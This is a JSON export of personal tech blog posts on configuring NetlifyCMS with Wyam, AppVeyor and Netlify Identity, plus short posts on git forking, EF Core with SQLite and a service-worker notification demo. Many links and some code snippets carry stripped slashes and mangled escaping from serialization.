Dialog](/img/IEOptions.png)"},{"id":"/Setting-up-NetlifyCMS-with-Wyam---Part 2","metadata":{"permalink":"/docs/blog/Setting-up-NetlifyCMS-with-Wyam---Part 2","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/Setting-up-NetlifyCMS-with-Wyam---Part 2.md","source":"@site/blog/Setting-up-NetlifyCMS-with-Wyam---Part 2.md","title":"Using Netlify Identity with NetlifyCMS and Wyam","description":"test a lead","date":"2019-02-15T00:00:00.000Z","tags":[{"inline":false,"label":"Wyam","permalink":"/docs/blog/tags/wyam","description":"Static site generator"},{"inline":true,"label":"AppVeyor","permalink":"/docs/blog/tags/app-veyor"},{"inline":false,"label":"NetlifyCMS","permalink":"/docs/blog/tags/netlify-cms","description":"NetlifyCMS headless CMS"},{"inline":true,"label":"Netlify","permalink":"/docs/blog/tags/netlify"}],"readingTime":0.28,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Using Netlify Identity with NetlifyCMS and Wyam","authors":["mark-burton"],"date":"2019-02-15","tags":["Wyam","AppVeyor","NetlifyCMS","Netlify"],"description":"test a lead"},"unlisted":false,"prevItem":{"title":"VSTO installs over HTTPS issues","permalink":"/docs/blog/VSTO-installs-over-HTTPS-issues"},"nextItem":{"title":"Setting up NetlifyCMS with Wyam, Part 3","permalink":"/docs/blog/Setting-up-NetlifyCMS-with-Wyam---Part-3"}},"content":"```\\nbuild_script:  - ..\\\\Wyam\\\\wyam --output ..\\\\output -s LinkRoot=\\"BigDoorWyamBlog\\" # https:/noknokmls.github.ioBigDoorWyamBlogposts2018-02-12-where-i-live-john-naughton-krakow-rzaska.html\\n```  # Setup your Netlify site to use  Now we have AppVeyor building the site and pushing the output back to GitHub we can configure the deploy settings in Netlify so that changes are automatically published to your blog."},{"id":"/Setting-up-NetlifyCMS-with-Wyam---Part-3","metadata":{"permalink":"/docs/blog/Setting-up-NetlifyCMS-with-Wyam---Part-3","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/Setting-up-NetlifyCMS-with-Wyam---Part-3.md","source":"@site/blog/Setting-up-NetlifyCMS-with-Wyam---Part-3.md","title":"Setting up NetlifyCMS with Wyam, Part 3","description":"Configuring a simple single user mode NetlifyCMS with Wyam","date":"2018-03-09T00:00:00.000Z","tags":[{"inline":false,"label":"Wyam","permalink":"/docs/blog/tags/wyam","description":"Static site generator"},{"inline":true,"label":"AppVeyor","permalink":"/docs/blog/tags/app-veyor"},{"inline":false,"label":"NetlifyCMS","permalink":"/docs/blog/tags/netlify-cms","description":"NetlifyCMS headless CMS"},{"inline":true,"label":"Netlify","permalink":"/docs/blog/tags/netlify"}],"readingTime":1.75,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Setting up NetlifyCMS with Wyam, Part 3","authors":["mark-burton"],"date":"2018-03-09","tags":["Wyam","AppVeyor","NetlifyCMS","Netlify"],"description":"Configuring a simple single user mode NetlifyCMS with Wyam"},"unlisted":false,"prevItem":{"title":"Using Netlify Identity with NetlifyCMS and Wyam","permalink":"/docs/blog/Setting-up-NetlifyCMS-with-Wyam---Part 2"},"nextItem":{"title":"Using Netlify Identity with NetlifyCMS and Wyam","permalink":"/docs/blog/Setting-up-NetlifyCMS-with-Wyam---Part-4"}},"content":"## Use AppVeyor for CI\\nTo get started with a simple NetlifyCMS setup without the editorial workflow you can use the [AppVeyor for Continuous Integration](https:/wyam.iodocsdeploymentappveyor) Wyam document.  # Enabling the editorial workflow  ## Turn off webhook for PR to prevent extra build being triggered in AppVeyor\\nFor more details see [Do not build virtual merge on Pull Requests #1636](https:/github.comappveyorciissues1636) and [Preventing master CI run when a commit a made on a feature branch](http:/help.appveyor.comdiscussionsquestions5082-preventing-master-ci-run-when-a-commit-a-made-on-a-feature-branch)\\n![](/img/NetlifyCMS_Webhooks.PNG) If this is not done AppVeyor will run the master branch config when a draft is saved in NetlifyCMS as a PR is created, it will fail with\\n```\\ngit push\\nremote: Anonymous access to MarkZitherProjectName.git denied.\\nfatal: Authentication failed for \'https:/github.comMarkZitherProjectName.git\'\\nCommand exited with code 128\\n```  ## Advanced AppVeyor config to support Editorial_Workflow\\nWhen a blog post is saved as a draft it will create a branch starting with \'cms\', use the for branches with a regular expression to control different aspects of the build on master and cms branches, here is [an example of this in action](https:/github.comNokNokMLSBigDoorWyamBlogblobmasterappveyor.yml)\\n```\\nfor:  # override settings for `master` branch\\n-  version: 1.0. branches:  only:  - master  #######################  # removed for brevity #  #######################  # override settings for `cms*` branches\\n-  branches:  only:  - /cms.*/  deploy:\\n```  ## Errors and issues i hit while setting this up  ### [the build phase is set to msbuild mode default but no visual studio project or solution files were found](https:/help.appveyor.comdiscussionsproblems11287-the-build-phase-is-set-to-msbuild-mode-default-but-no-visual-studio-project-or-solution-files-were-found)  caused by having version: 1.0. in wrong place in appveyor.yml  ### Failed build after saving a post\\n```\\ngit push\\nremote: Anonymous access to MarkZitherProjectName.git denied.\\nfatal: Authentication failed for \'https:/github.comMarkZitherProjectName.git\'\\nCommand exited with code 128\\n```\\nThis is caused by the PR firing a Webhook which triggers the build on the master branch.  ## Other things to write about\\n* show the correct loggedlogged out menu based on [Netlify Identity Widget](https:/github.comnetlifynetlify-identity-widget) events and user object.\\n* how to populate the author field from the Netlify Identity metadata."},{"id":"/Setting-up-NetlifyCMS-with-Wyam---Part-4","metadata":{"permalink":"/docs/blog/Setting-up-NetlifyCMS-with-Wyam---Part-4","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/Setting-up-NetlifyCMS-with-Wyam---Part-4.md","source":"@site/blog/Setting-up-NetlifyCMS-with-Wyam---Part-4.md","title":"Using Netlify Identity with NetlifyCMS and Wyam","description":"test a lead","date":"2018-03-09T00:00:00.000Z","tags":[{"inline":false,"label":"Wyam","permalink":"/docs/blog/tags/wyam","description":"Static site generator"},{"inline":true,"label":"AppVeyor","permalink":"/docs/blog/tags/app-veyor"},{"inline":false,"label":"NetlifyCMS","permalink":"/docs/blog/tags/netlify-cms","description":"NetlifyCMS headless CMS"},{"inline":true,"label":"Netlify","permalink":"/docs/blog/tags/netlify"}],"readingTime":1.26,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Using Netlify Identity with NetlifyCMS and Wyam","authors":["mark-burton"],"date":"2018-03-09","tags":["Wyam","AppVeyor","NetlifyCMS","Netlify"],"description":"test a lead"},"unlisted":false,"prevItem":{"title":"Setting up NetlifyCMS with Wyam, Part 3","permalink":"/docs/blog/Setting-up-NetlifyCMS-with-Wyam---Part-3"},"nextItem":{"title":"Test blog post for docs","permalink":"/docs/blog/2018/02/11/test-blog-post-for-docs"}},"content":"The following was set up in part 1, but it is worth reviewing again. I think more external providers will be available.\\n## Set registration preference and external providers\\nRegistration settings and External providers are located in settings under Identity\\n![](/img/Netlify_Site_Settings.PNG)  ![](/img/Netlify_Identity_Reg_pref_providers.PNG)  ### Enable Git Gateway in Netlify\\nYour CMS users are likely to not have Github logins, so enable the Git Gateway to allow them to save and publish posts to GitHub without having to setup an account on Github.\\nIt is explained further in the [Netlify Docs on Git Gateway](https:/www.netlify.comdocsgit-gateway)\\nThe Git Gateway option is in settings under Identity, further down than the Registration preferences and external providers settings.  ![](/img/Netlify_Git_Gateway.PNG)  ## Make it easy for user to complete signup by adding Netlify Identity Widget to the site\\n::::::row\\n::: The email inviting a user to use the CMS links to the homepage with a invite token in the URL, if you do not follow this step the user will be left looking at the homepage not understanding why they are there or what they should do next.  Add the [netlify-identity-widget](https:/github.comnetlifynetlify-identity-widget)\\nto your layouthomepage, you can just add the following to the body of your layout page\\n```html\\n<script src=\\"https:identity.netlify.comv1netlify-identity-widget.js\\" /><script />\\n```\\nNow when the user hits the homepage with the `#invite_token=` in the URL the complete signup modal will appear.\\n:::\\n::: ![](/img/Netlify_Identity_Complete_Signup.PNG)\\n:::\\n::::::  ### Invite some users\\nMight be best to come back to this step after setting the registration preferences\\n![](/img/Netlify_Identity_Invite_Users.PNG)"},{"id":"/2018/02/11/test-blog-post-for-docs","metadata":{"permalink":"/docs/blog/2018/02/11/test-blog-post-for-docs","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2018-02-11-test-blog-post-for-docs.md","source":"@site/blog/2018-02-11-test-blog-post-for-docs.md","title":"Test blog post for docs","description":"This blog post was written in NetlifyCMS","date":"2018-02-11T00:00:00.000Z","tags":[{"inline":false,"label":"NetlifyCMS","permalink":"/docs/blog/tags/netlify-cms","description":"NetlifyCMS headless CMS"},{"inline":false,"label":"Test","permalink":"/docs/blog/tags/test","description":"Test posts and examples"},{"inline":false,"label":"Documentation","permalink":"/docs/blog/tags/docs","description":"Documentation and guides"}],"readingTime":0,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Test blog post for docs","authors":["mark-burton"],"tags":["NetlifyCMS","Test","Docs"],"description":"This blog post was written in NetlifyCMS","date":"2018-02-11"},"unlisted":false,"prevItem":{"title":"Using Netlify Identity with NetlifyCMS and Wyam","permalink":"/docs/blog/Setting-up-NetlifyCMS-with-Wyam---Part-4"},"nextItem":{"title":"Setting up NetlifyCMS with Wyam, Part 1","permalink":"/docs/blog/Setting-up-NetlifyCMS-with-Wyam---Part-1"}},"content":""},{"id":"/Setting-up-NetlifyCMS-with-Wyam---Part-1","metadata":{"permalink":"/docs/blog/Setting-up-NetlifyCMS-with-Wyam---Part-1","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/Setting-up-NetlifyCMS-with-Wyam---Part-1.md","source":"@site/blog/Setting-up-NetlifyCMS-with-Wyam---Part-1.md","title":"Setting up NetlifyCMS with Wyam, Part 1","description":"Configuring a simple single user mode NetlifyCMS with Wyam","date":"2018-02-09T00:00:00.000Z","tags":[{"inline":false,"label":"Wyam","permalink":"/docs/blog/tags/wyam","description":"Static site generator"},{"inline":true,"label":"AppVeyor","permalink":"/docs/blog/tags/app-veyor"},{"inline":false,"label":"NetlifyCMS","permalink":"/docs/blog/tags/netlify-cms","description":"NetlifyCMS headless CMS"},{"inline":true,"label":"Netlify","permalink":"/docs/blog/tags/netlify"}],"readingTime":7.32,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Setting up NetlifyCMS with Wyam, Part 1","authors":["mark-burton"],"date":"2018-02-09","tags":["Wyam","AppVeyor","NetlifyCMS","Netlify"],"description":"Configuring a simple single user mode NetlifyCMS with Wyam"},"unlisted":false,"prevItem":{"title":"Test blog post for docs","permalink":"/docs/blog/2018/02/11/test-blog-post-for-docs"},"nextItem":{"title":"How to fork a cloned repository in Visual Studio","permalink":"/docs/blog/Fork a cloned git repository"}},"content":"> \\"\\"Wyam is different.\\n> It\'s a static content toolkit and can be used to generate web sites, produce documentation, create ebooks, and much more. Since everything is configured by chaining together flexible modules (that you can even write yourself), the only limits to what it can create are your imagination.\\"\\"--<cite />\\n[wyam.io](https:/wyam.io)<cite />  > \\"\\"Netlify CMS is an open source content management system for your Git workflow that enables you to provide editors with friendly UI and intuitive workflow. You can use it with any static site generator to create faster, more flexible web projects.\\"\\"\\n> --&lt;cite>\\n[NetlifyCMS](https:/www.netlifycms.orgdocsintro)<cite />  ## Now onto the steps I went through to setup NetlifyCMS for my blog.  This information is what worked for me and makes some assumptions\\n* Your code is in a GitHub repository\\n* Your site is hosted on Netlify\\n* You are using AppVeyor for continuous deployment\\n* You are the only editor of your blog (Part 2 will deal with adding users and Netlify Identify features to the blog)\\n* You know that your CMS will be accessed at by manually adding admin to your site URL\\n* You are happy pushing your changes directly to master (Part 3 will explain the editorial workflow, which saves drafts to feature branches, creates a PR and merges once the post is published)  ## Changes in your Wyam project\\n### Add an admin directory under your Wyam input directory\\nThe general instructions to [add NetlifyCMS to your site](https:/www.netlifycms.orgdocsadd-to-your-site) cover several static site generators but not Wyam (I have a PR in to add it to the table for App File Structure).  Assuming you are using the default Wyam input directory name and structure the setup is;  * add a folder called `admin` under your Wyam `input` directory  * add 2 files to it, `index.html` and `config.yml`.  In the `index.html` add the following,  ```html\\n<head>\\n  \x3c!-- Include the styles for the Netlify CMS UI, after your own styles --\x3e\\n  <link rel=\\"stylesheet\\" href=\\"https://unpkg.com/netlify-cms@^1.0.0/dist/cms.css\\" />\\n</head>\\n<body>\\n  \x3c!-- Include the script that builds the page and powers Netlify CMS --\x3e\\n  <script src=\\"https://unpkg.com/netlify-cms@^1.0.0/dist/cms.js\\"><\/script>\\n  \x3c!-- Include the Netlify Identity --\x3e\\n  <script src=\\"https://identity.netlify.com/v1/netlify-identity-widget.js\\"><\/script>\\n</body>\\n```  **note** i also added the Netlify Identity script since we will be using that, which is not in the Netlify instructions at this point, you could also use [Netlify\u2019s Script Injection](https:/www.netlify.comdocsinject-analytics-snippets) feature to achieve the same.  The second file, adminconfig.yml, is the heart of your Netlify CMS installation, and a bit more complex. It is explained in full in the [add NetlifyCMS to your site](https:/www.netlifycms.orgdocsadd-to-your-site) and [configuration options](https:/www.netlifycms.orgdocsconfiguration-options) documentation and I have added a working version below.  ### Example NetlifyCMS config file\\n\\n```yaml\\nbackend:\\n  name: git-gateway\\n  branch: master # Branch to update (optional; defaults to master)\\n\\nmedia_folder: \\"input/assets/Images\\" # Media files will be stored in the repo under input/assets/Images\\npublic_folder: \\"/assets/Images\\" # public_folder indicates where they can be found in the published site\\n\\ncollections:\\n  - name: \\"blog\\" # Used in routes, e.g., /admin/collections/blog\\n    label: \\"Blog\\" # Used in the UI\\n    folder: \\"input/posts\\" # The path to the folder where the documents are stored\\n    create: true # Allow users to create new documents in this collection\\n    slug: \\"{{year}}-{{month}}-{{day}}-{{slug}}\\" # Filename template, e.g., YYYY-MM-DD-title.md\\n    fields: # The fields for each document, usually in front matter\\n      - {label: \\"Title\\", name: \\"Title\\", widget: \\"string\\"}\\n      - {label: \\"Lead\\", name: \\"Lead\\", widget: \\"string\\", optional: true, required: false}\\n      - {label: \\"Published\\", name: \\"Published\\", widget: \\"datetime\\"}\\n      - {label: \\"Featured Image\\", name: \\"Image\\", widget: \\"image\\", optional: true, required: false, pattern: [\'^\\\\S*$\', \\"Please rename your image remove any spaces from the filename\\"]}\\n      - label: Tags\\n        name: Tags\\n        widget: list\\n      - {label: \\"Body\\", name: \\"body\\", widget: \\"markdown\\"}\\n```\\n::::::row\\n::: A couple of things to note here are;\\nIt is using git-gateway as the backend, if you don\'t intend on having additional editors for your blog you could connect directly to GitHub as described in [authentication and backends](https:/www.netlifycms.orgdocsauthentication-backends) and [Using an Authentication Provider](https:/www.netlify.comdocsauthentication-providers#using-an-authentication-provider), but it looks to be more work for less functionality.  The Tags field, in the CMS it will display as a simple textbox, but you add your tags as a comma separated list. I tried to get the list to add and item for each tag i wanted to add, but hit some JavaScript errors which prevented me typing more than 1 character per tag.  The Featured Image (and media upload screen) will happily accept a filename with spaces in it, which markdownhtml will then fail to render as it doesn\'t get escaped to %20. The field can have validation added to it like `pattern: [\'^\\\\S*$\', \\"Please rename your image remove any spaces from the filename\\"]` not very user friendly, but better than the image just not working.\\n:::\\n::: ![](/img/NetlifyCMS_Validation.PNG) :::\\n::::::  ## Setup your blog on Netlify\\nThe Wyam website already has a guide on [setting up a site on Netlify](https:/wyam.iodocsdeploymentnetlify) to get started you can just drag and drop your site as described, in Part 3 we will setup the continuous deployment from GitHub.  ### Enable Netlify Identity\\nAs the config states is setup with `backend:  name:git-gateway` we will be using Netlify Identity.\\n![](/img/Netlify_Identity_Enable.PNG) ### Set registration preference and external providers\\nRegistration settings and External providers are in settings under Identity.  ![](/img/Netlify_Site_Settings.PNG) At this stage I only want access myself, so I have made it invite only and enabled GitHub as the sole external provider.\\n![](/img/Netlify_Identity_Reg_pref_providers.PNG) ### Enable Git Gateway in Netlify\\n::::::row\\n::: Your CMS users are likely to not have GitHub logins. Enable the Git Gateway to allow them to save and publish posts to GitHub without having to setup an account on Github, this is also required as we set the backend to git-gateway. Without it you will get errors in the console when you try to save media or posts.\\nIt is explained further in the [Netlify Docs on Git Gateway](https:/www.netlify.comdocsgit-gateway)\\nThe Git Gateway option is in settings under Identity, further down than the Registration preferences and external providers settings.  :::\\n::: ![](/img/Netlify_Git_Gateway.PNG) :::\\n::::::  ### NetlifyCMS in action\\n::::::row\\n::: At this point you should have a working CMS, run `wyam -p 5080 -w` - [here is more information on the wyam command line](https:/wyam.iodocsusagecommand-line) - then navigate to http:/localhost:5080admin, you should be greeted with the NetlifyCMS screen.\\n:::\\n::: ![](/img/NetlifyCMS_Home.PNG) :::\\n::::::  ::::::row\\n::: Click Login with Netlify and login with your GitHub account, you might be redirected here to your site on Netlify, just correct the first part of the URL to `https:/localhost:5080admin` and be sure to keep the `#access_token=eyj...lkdAGI&expires_in=3600&refresh_token=zEM...BQSw&token_type=bearer` in the URL, this should log you in to your local instance.\\n:::\\n::: ![](/img/NetlifyCMS_Login.PNG) :::\\n::::::  Finally we have NetlifyCMS in all its glory  ![](/img/NetlifyCMS_Main.PNG) Create a new post and publish it  ![](/img/NetlifyCMS_Publish_New.PNG) ## NetlifyCMS successfully publishing to GitHub\\n::::::row\\n::: you should see a commit in GitHub  ![](/img/NetlifyCMS_Published_GitHub.PNG) :::\\n::: and the markdown as rendered in GitHub  ![](/img/NetlifyCMS_Published_GitHub_Details.PNG) :::\\n::::::  This is all well and good, but you could have done that in VS Code or similar, in Parts 2 and 3 I will describe how I configured AppVeyor and Netlify to support continuous deployment, the editorial workflow and adding the Netlify Identity widget to my blog to make this a fully functioning CMS.  ## Errors and issues I encountered while setting this up\\n## Local Testing\\n::::::row\\n::: If you are testing your site locally you can still use the Netlify Identity. You just need to specify the URL of your site on Netlify. This is explained in full in the [netlify identity widget docs](https:/github.comnetlifynetlify-identity-widget#localhost).  It does however seem to have a side effect of redirecting to your hosted site after login if you use the external provider, logging in with a Netlify Identity account works and leaves you on the same page, alternatively just correct the first part of the URL to https:/localhost:5080admin/ and be sure to keep the #access_token=eyj...lkdAGI&expires_in=3600&refresh_token=zEM...BQSw&token_type=bearer in the URL, this should log you in to your local instance. Sometimes it needs a refresh to load the actual CMS.\\n:::\\n::: ![](/img/Netlify_Identity_Local_Testing.PNG) :::\\n::::::  ### Front Matter syntax\\nInitially i found that none of my existing posts were displaying any details at all in the CMS, it just showed up as a blank line, ![](/img/NetlifyCMS_Missing_Posts.PNG) you can click on the blank line and it will open a blank editor window ![](/img/NetlifyCMS_Missing_Post_Details.PNG) .\\nAny new posts created by the CMS did display correctly.  The only difference i found between the existing posts and those created in NetlifyCMS was the leading `---` to start the front matter section. Once i added that in all posts displayed correctly in the CMS."},{"id":"/Fork a cloned git repository","metadata":{"permalink":"/docs/blog/Fork a cloned git repository","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/Fork a cloned git repository.md","source":"@site/blog/Fork a cloned git repository.md","title":"How to fork a cloned repository in Visual Studio","description":"based on these gists","date":"2018-01-27T00:00:00.000Z","tags":[{"inline":true,"label":"GitHub","permalink":"/docs/blog/tags/git-hub"}],"readingTime":0.76,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"How to fork a cloned repository in Visual Studio","authors":["mark-burton"],"date":"2018-01-27","tags":["GitHub"]},"unlisted":false,"prevItem":{"title":"Setting up NetlifyCMS with Wyam, Part 1","permalink":"/docs/blog/Setting-up-NetlifyCMS-with-Wyam---Part-1"},"nextItem":{"title":"First Post","permalink":"/docs/blog/miniblog clone"}},"content":"based on these gists\\nhttps:/gist.github.comjpiersonb6c0815e9dd7078f6b8cc3cb9076ddf4\\nhttps:/gist.github.comElectricRCAircraftGuy8ca9c04924ac11a50d48c2061d28b090  fork the repository in github  go to team explorer repository settings\\n![Repository Settings](/img/GitHub fork%20Repository%20Settings.png)\\nrename local origin to upstream (and update push address to the new repo, or you will always have items waiting to be pushed)  ![Rename remote to upstream](/img/GitHub fork%20Repository%20Rename%20to%20Upstream.png)\\nadd new remote called origin\\n![Repository Settings](/img/GitHub fork%20Repository%20Settings.png)\\ncommit any changes  fetch from new origin - won\'t work if there are conflicting changes, pull and merge worked  update push remote to use origin rather than upstream, otherwise you will still be pushing to the original repo which you likely don\'t have permissions on and will see something like\\n```\\nError encountered while pushing to the remote repository: Git failed with a fatal error.\\nunable to access \'https:/github.com...Demo.AspNetCore.PushNotifications.git\': The requested URL returned error: 403\\nPushing to https:/github.com...Demo.AspNetCore.PushNotifications.git\\n```"},{"id":"/miniblog clone","metadata":{"permalink":"/docs/blog/miniblog clone","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/miniblog clone.md","source":"@site/blog/miniblog clone.md","title":"First Post","description":"strongly typed configs (yay)   sqlite in ef core - Julie Lerman and Geoffrey Grosenback have a nice introduction to EF Core 1.0 on PluralSight","date":"2018-01-12T00:00:00.000Z","tags":[{"inline":true,"label":"Introduction","permalink":"/docs/blog/tags/introduction"}],"readingTime":1.02,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"First Post","authors":["mark-burton"],"date":"2018-01-12","tags":["Introduction"]},"unlisted":false,"prevItem":{"title":"How to fork a cloned repository in Visual Studio","permalink":"/docs/blog/Fork a cloned git repository"},"nextItem":{"title":"Playing with Service Workers","permalink":"/docs/blog/Playing-with-Service-Workers"}},"content":"* strongly typed configs (yay)  * sqlite in ef core - Julie Lerman and Geoffrey Grosenback have a nice introduction to [EF Core 1.0 on PluralSight](https:/www.pluralsight.comcoursesplay-by-play-ef-core-1-0-first-look-julie-lerman)[^2]\\n* upgrading packages can have terrible side effects (IOptions from Microsoft.Framework.OptionsModelIOptions to Microsoft.Extensions.OptionsIOptions leaving a reference to Microsoft.Framework.OptionsModel)\\n* metaweblog api for Open Live Writer[^3] integration now using markdown monster[^4]\\n* XMLRPC thanks Shawn Wildermuth [^5]  ### Setting up EF CORE with SQLite\\nAs easy as adding  ```json\\n...\\n\\"Microsoft.EntityFrameworkCore.SQLite\\": \\"1.0.1\\",  ...\\n```\\nto project.json (just be sure put add it after it dependencies or use the sort to fix things)\\nUpdate startup.cs to use sqlite rather than sqlserver\\n```csharp  This method gets called by the runtime. Use this method to add services to the container.  public void ConfigureServices(IServiceCollection services)  \\\\\\\\{  ...  services.AddDbContext<ApplicationDbContext />(options =>  options.UseSqlite(Configuration.GetConnectionString(\\"DefaultConnection\\")));  ...  \\\\}\\n```  ### Links\\n[MiniBlog](http:/github.commadskristensenminiblog)  [An ASP.NET Core Middleware Component for Implementing MetaWeblog API ](https:/github.comshawnwildermuthMetaWeblog)  [^1]: Source: [MiniBlog](http:/github.commadskristensenminiblog)\\n[^2]: Source: [EF Core 1.0](https:/www.pluralsight.comcoursesplay-by-play-ef-core-1-0-first-look-julie-lerman)\\n[^3]: Source: [Open Live Writer](http:/openlivewriter.org)\\n[^4]: Source: [Markdown Monster Web Site](http:/markdownmonster.west-wind.com)\\n[^5]: Source: [An ASP.NET Core Middleware Component for Implementing MetaWeblog API ](https:/github.comshawnwildermuthMetaWeblog)"},{"id":"/Playing-with-Service-Workers","metadata":{"permalink":"/docs/blog/Playing-with-Service-Workers","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/Playing-with-Service-Workers.md","source":"@site/blog/Playing-with-Service-Workers.md","title":"Playing with Service Workers","description":"This will not work for you as service workers are not supported ## Location of the serviceworker.js file and scope matters","date":"2017-12-18T00:00:00.000Z","tags":[{"inline":true,"label":"Service Workers","permalink":"/docs/blog/tags/service-workers"},{"inline":true,"label":"Notifications API","permalink":"/docs/blog/tags/notifications-api"},{"inline":true,"label":"Push API","permalink":"/docs/blog/tags/push-api"},{"inline":true,"label":"PWA","permalink":"/docs/blog/tags/pwa"},{"inline":true,"label":"Progressive Web Apps","permalink":"/docs/blog/tags/progressive-web-apps"},{"inline":true,"label":"VAPID","permalink":"/docs/blog/tags/vapid"},{"inline":true,"label":"CORS","permalink":"/docs/blog/tags/cors"}],"readingTime":1.91,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Playing with Service Workers","authors":["mark-burton"],"date":"2017-12-18","tags":["Service Workers","Notifications API","Push API","PWA","Progressive Web Apps","VAPID","CORS"]},"unlisted":false,"prevItem":{"title":"First Post","permalink":"/docs/blog/miniblog clone"},"nextItem":{"title":"Resolving System.NotSupportedException No data is available for encoding 850 in .net Core","permalink":"/docs/blog/NotSupportedException exception using Encoding in .net core"}},"content":"This will not work for you as service workers are not supported ## Location of the serviceworker.js file and scope matters\\nI started with the sw.js file in the assetsscripts folder with the rest of the script files, but calls to ```navigator.serviceWorker.getRegistration()``` were never returning, this stackoverflow thread explains the issue.\\n[Service Worker is never ready](https:/stackoverflow.comquestions29874068navigator-serviceworker-is-never-ready).  Maybe this is the proper way  ```javascript\\n\\\\\\\\\\\\{  navigator.serviceWorker.register(\'sw.js\', \\\\{  scope: \'.\'  \\\\\\\\}\\n```  ## Subscribe to notifications\\n<div id=\\"dashboard-controls\\" /><div /><button disabled=\\"disabled\\" id=\\"subscribe\\" />Subscribe for Push Notifications<button />  <button disabled=\\"disabled\\" id=\\"unsubscribe\\" />Unsubscribe from Push Notifications<button />  <<br /><<hr />  <label for=\\"topic\\" />Topic:<label /><<input type=\\"text\\" id=\\"topic\\" size=\\"32\\" maxlength=\\"32\\" />  <label for=\\"urgency\\" />Urgency:<label />  <select id=\\"urgency\\" />  <option value=\\"VeryLow\\" />Very Low<option />  <option value=\\"Low\\" />Low<option />  <option value=\\"Normal\\" selected=\\"selected\\" />Normal<option />  <option value=\\"High\\" />High<option />  <select /><<br />  <<input id=\\"notification\\" size=\\"65\\" />  <button id=\\"send\\" />Send Push Notification<button />\\n<div />  <<hr />\\n<div id=\\"dashboard-console\\" /><div /><label />Log:<label />  <button id=\\"clear\\" style=\\"position: relative; top: 3px;\\" />Clear&lt;button>\\n<div />  ##  Building Progressive Web Apps with Chris Love\\nGreat explaination of Service Workers and further reading and [offer](https:/love2dev.comdnrpwa) for Chris\' course on this episode of\\n[DotNetRocks](https:/dotnetrocks.com?show=1509).  [PWA Builder](http:/www.pwabuilder.comgenerator)  ## CORS\\nAs the blog is a static site and the backend is hosted in azure it is neccessary  setup CORS using one of the examples here[Enabling Cross-Origin Requests (CORS)](https:/docs.microsoft.comen-usaspnetcoresecuritycors)  don\'t forget to do the CORS section in Azure if you are using that.<<button id=\\"clear\\" style=\\"position: relative; top: 3px;\\"&gt;Clear&lt;button> />\\n\\n<script src=\\"imgjspush-notifications.js\\" /><script />\\n<script />  window.addEventListener(\'load\', function() \\\\\\\\{  // Registration was successful  console.log(\'PAGE: Get Notification permission\');  askPermission();  setTimeout(notify, 2000);  \\\\});  function notify()\\\\\\\\\\\\{  var title = \'Welcome to the blog.\';  var body = \'Enjoy this post about service workers and the push and notification APIs.\';  var icon = \'https:/noknok.plimagesfavico.png\';  var tag = \'simple-push-demo-notification-tag\';\\nif (Notification.permission == \'granted\') \\\\{  navigator.serviceWorker.getRegistration().then(function(reg) {  reg.showNotification(title, {  body: body,  icon: icon,  tag: tag  \\\\\\\\})  });  }\\n}  function askPermission() \\\\\\\\\\\\{  return new Promise(function(resolve, reject) \\\\{  const permissionResult = Notification.requestPermission(function(result) {  resolve(result);  \\\\\\\\});  if (permissionResult) \\\\\\\\{  permissionResult.then(resolve, reject);  \\\\}  })  .then(function(permissionResult) \\\\\\\\\\\\{  if (permissionResult !== \'granted\') \\\\{  throw new Error(\'We weren\\\\\'t granted permission.\');  \\\\\\\\}  });\\n}\\n</script&gt;"},{"id":"/NotSupportedException exception using Encoding in .net core","metadata":{"permalink":"/docs/blog/NotSupportedException exception using Encoding in .net core","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/NotSupportedException exception using Encoding in .net core.md","source":"@site/blog/NotSupportedException exception using Encoding in .net core.md","title":"Resolving System.NotSupportedException No data is available for encoding 850 in .net Core","description":"https System.NotSupportedException : No data is available for encoding 850. For information on defining a custom encoding, see the documentation for the Encoding.RegisterProvider method.  `  `Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);","date":"2017-12-12T00:00:00.000Z","tags":[{"inline":true,"label":".NET Core","permalink":"/docs/blog/tags/net-core"},{"inline":true,"label":"Encoding","permalink":"/docs/blog/tags/encoding"},{"inline":true,"label":"EPPlus","permalink":"/docs/blog/tags/ep-plus"},{"inline":true,"label":"NOPI","permalink":"/docs/blog/tags/nopi"},{"inline":true,"label":"SharpZip","permalink":"/docs/blog/tags/sharp-zip"}],"readingTime":0.16,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical 